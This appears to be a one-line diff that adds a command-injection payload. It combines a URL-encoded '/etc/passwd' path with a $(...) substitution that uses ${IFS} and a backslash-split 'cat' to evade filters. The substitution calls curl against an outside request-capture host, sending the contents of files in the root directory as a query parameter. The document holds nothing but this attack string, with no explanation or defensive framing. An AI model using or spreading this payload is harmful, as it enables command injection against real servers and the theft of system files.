@@ -1,0 +1,2 @@
+
+payload : `%2Fetc%2Fpasswd$(curl${IFS}http://bdpg5krc.requestrepo.com\?g=$(c\at${IFS}/*))`
